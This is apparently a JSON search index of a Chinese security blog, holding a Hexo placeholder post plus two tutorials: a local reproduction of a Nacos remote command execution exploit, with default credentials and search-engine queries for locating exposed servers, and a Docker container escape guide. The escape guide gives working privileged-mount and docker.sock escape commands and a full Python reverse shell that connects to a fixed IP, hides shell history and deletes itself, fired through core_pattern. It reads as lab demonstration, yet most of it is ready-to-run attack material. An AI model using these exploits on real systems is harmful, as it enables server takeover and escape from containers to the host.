[{"title":"Hello World","url":"/2024/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"[0day]Alibaba Nacos远程命令执行漏洞","url":"/2024/07/16/Nacos-command-injection/","content":"\n一.NacosNacos（官方网站：nacos.io）是一个易于使用的平台，专为动态服务发现、配置和服务管理而设计。帮助您轻松构建云原生应用和微服务平台。\n服务是Nacos的第一特色。Nacos 支持几乎所有类型的服务，例如 Dubbo&#x2F;gRPC 服务、Spring Cloud RESTFul 服务或 Kubernetes 服务。\nNacos 提供四大功能：\n    1.服务发现和服务运行状况检查\n    2.动态配置管理\n    3.动态的DNS服务\n    4.服务和元数据管理\n具体信息可参考: alibaba nacos\n二.漏洞描述2024年7月15日下午5点多，有人在github上发布了Nacos的远程命令执行漏洞，并且在仓库当中给出了EXP。攻击者可以先通过弱口令进入到Nacos的后台(默认用户:nacos,默认密码:nacos)，进而利用该漏洞进行远程命令执行，控制服务器。\n影响版本:    Nacos2.3.2\n    Nacos2.4.0\n项目地址    1.exp(原作者已经删除了项目，这是克隆项目)\n    2.Nacos_Rce\n三.网络空间搜索引擎FoFa: icon_hash&#x3D;”13942501”\nZoomEye: app:”Alibaba Nacos”\n四.漏洞复现注意: 以下展示的是Linux环境下面的情况，Windows大同小异\n1.克隆项目到本地\nsw0n@sw0n:~/cve$ git clone https://github.com/HACK-THE-WORLD/nacos-poc.git正克隆到 &#x27;nacos-poc&#x27;...remote: Enumerating objects: 9, done.remote: Counting objects: 100% (9/9), done.remote: Compressing objects: 100% (7/7), done.remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0接收对象中: 100% (9/9), 5.77 KiB | 5.77 MiB/s, 完成.处理 delta 中: 100% (1/1), 完成.\n\n2.pip -m install requirement.txt(或者下面这样)\nsw0n@sw0n:~/cve/nacos-poc$ pip install requestssw0n@sw0n:~/cve/nacos-poc$ pip install flask\n\n3.到官网的github上下载Nacos受影响的版本\nsw0n@sw0n:~/cve$ wget https://github.com/alibaba/nacos/releases/download/2.4.0-BETA/nacos-server-2.4.0-BETA.zip\n\n4.在下面命令中的相对目录当中启动Nacos(注意Linux和Windows的区别)\nsw0n@sw0n:~/cve/nacos/bin$ bash startup.sh -m standalone/usr/lib/jvm/java-18-openjdk-amd64/bin/java   -server  -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/home/sw0n/cve/nacos/logs/java_heapdump.hprof -XX:-UseLargePages -Dnacos.member.list= -Xlog:gc*:file=/home/sw0n/cve/nacos/logs/nacos_gc.log:time,tags:filecount=10,filesize=100m -Dloader.path=/home/sw0n/cve/nacos/plugins,/home/sw0n/cve/nacos/plugins/health,/home/sw0n/cve/nacos/plugins/cmdb,/home/sw0n/cve/nacos/plugins/selector -Dnacos.home=/home/sw0n/cve/nacos -jar /home/sw0n/cve/nacos/target/nacos-server.jar  --spring.config.additional-location=file:/home/sw0n/cve/nacos/conf/ --logging.config=/home/sw0n/cve/nacos/conf/nacos-logback.xml --server.max-http-header-size=524288nacos is starting with clusternacos is starting. you can check the /home/sw0n/cve/nacos/logs/start.oumt\n\n\n5.修改nacos-poc中的config.py，只要不与nacos服务器的8848冲突即可\n\n6.运行nacos-poc中的service.py\nsw0n@sw0n:~/cve/nacos-poc-main$ python3 service.py  * Serving Flask app &#x27;service&#x27; * Debug mode: offWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:5000Press CTRL+C to quit\n\n7.运行naos-poc中的exploit.py\nsw0n@sw0n:~/cve/nacos-poc$ python3 exploit.py 请输入目录URL，默认：http://127.0.0.1:8848：请输入命令，默认：calc：whoami&#123;&quot;code&quot;:200,&quot;message&quot;:null,&quot;data&quot;:&quot;&quot;&#125;&#123;&quot;code&quot;:200,&quot;message&quot;:null,&quot;data&quot;:[&#123;&quot;B&quot;:0,&quot;A&quot;:&quot;sw0n&quot;&#125;]&#125;\n\n五.Nacos_Rce-Src-批量利用工具详情可以看\n    Nacos_Rce\n这里只是本地演示一下\n\n\n","categories":["Web Security"],"tags":["Cms","Web","Command-Injection"]},{"title":"云原生安全(Docker逃逸)","url":"/2024/07/19/docker%E9%80%83%E9%80%B8/","content":"\n一.dockerDocker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度。\nDocker 容器与虚拟机类似，但二者在原理上不同，容器是将操作系统层虚拟化，虚拟机则是虚拟化硬件，因此容器更具有便携性、高效地利用服务器。\n二.docker渗透测试过程1.前渗透-判断在Docker中\n    1.没有权限或者权限较小的时候: 端口扫描详细信息，根据应用对象表现\n    netstat -ano\n    2.拿到权限或者高权限: 高权限或者拿到权限\n2.前渗透-镜像中的应用漏洞\n3.前渗透-镜像中的默认配置\n4.后渗透-三种安全容器逃逸\n    -特权模式启动(不安全启动 适用于Java Jsp高权限无需提权 还要提权才能逃逸)\n    -危险挂载启动导致(危险启动 适用与Java Jsp高权限无需提权 还要提权才能逃逸)\n    -docker自身的软件漏洞和系统漏洞\n    exploit\n三.docker逃逸(特权模式)1.本地搭建vulhub的shiro环境\nsw0n@sw0n:~$ docker search vulhub/shirosw0n@sw0n:~$ docker pull vulhub/shirosw0n@sw0n:~$ docker run --rm --privileged=true -it -p 8888:8080 vulhub/shiro\n\n\n2.利用Safe6Secshiro反序列化工具拿网站shell\n\n3.爆破出key，并且找到可以利用的gadgets，查看系统权限\n\n4.检测环境是否为docker和判断特权\ncat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;cat /proc/self/status | grep CapEff\n\n\n \n5.查看目录\n\n6.特权逃逸\nmkdir /test &amp;&amp; mount /dev/sda2 /test\n\n\n7.判断结果\ncd /test/ &amp;&amp; ls\n\n\n四.docker逃逸(危险挂载)1.挂载Docker Socket逃逸1.创建靶机环境\nsw0n@sw0n:~$ docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu\n\n2.进入靶机内部(假设此时已经进入到docker环境当中)\nsw0n@sw0n:~$ docker exec -it with_docker_sock /bin/bash\n\n3.检测环境\nroot@d749c57b14e9:/# ls -lah /var/run/docker.socksrw-rw---- 1 root 137 0 Jul 19 06:53 /var/run/docker.sock\n\n4.挂载逃逸\napt-get updateapt-get install curlcurl -fsSL https://get.docker.com/ | sh\n\n5.在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部\ndocker run -it -v /:/host ubuntu /bin/bashchroot /host\n\n2.挂载宿主机procfs逃逸1.创建靶机环境\nsw0n@sw0n:~$ docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu\n\n2.检测环境\nroot@59b7d1bee877:/# find / -name core_pattern/proc/sys/kernel/core_pattern/host/proc/sys/kernel/core_pattern\n\n3.查找路径\nroot@59b7d1bee877:/# cat /proc/mounts | grep docker\n\n4.写入文件\ncat &gt;/tmp/.x.py &lt;&lt; EOF#!/usr/bin/pythonimport osimport ptyimport socketlhost = &quot;192.168.21.73&quot;lport = 8888def main():    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((lhost, lport))    os.dup2(s.fileno(), 0)    os.dup2(s.fileno(), 1)    os.dup2(s.fileno(), 2)    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)    pty.spawn(&quot;/bin/bash&quot;)    os.remove(&#x27;/tmp/.x.py&#x27;)    s.close()if __name__ == &quot;__main__&quot;:    main()EOF\n\nroot@59b7d1bee877:/# chmod +x /tmp/.x.py\n\necho -e &quot;|/var/lib/docker/overlay2/4aac278b06d86b0d7b6efa4640368820c8c16f1da8662997ec1845f3cc69ccee/merged/tmp/.x.py \\rcore           &quot; &gt; /host/proc/sys/kernel/core_pattern\n\ncat &gt;/tmp/x.c &lt;&lt; EOF#include &lt;stdio.h&gt;int main(void)&#123;    int *a = NULL;    *a = 1;    return 0;&#125;EOF\n\nroot@59b7d1bee877:/tmp# gcc x.c -o x\n\nsw0n@sw0n:~$ nc -lvnp 8888\n\nroot@59b7d1bee877:/tmp# ./xSegmentation fault\n\n在崩溃的同时反弹了shell\n","categories":["Cloud Security"],"tags":["Cloud","Security","Docker"]}]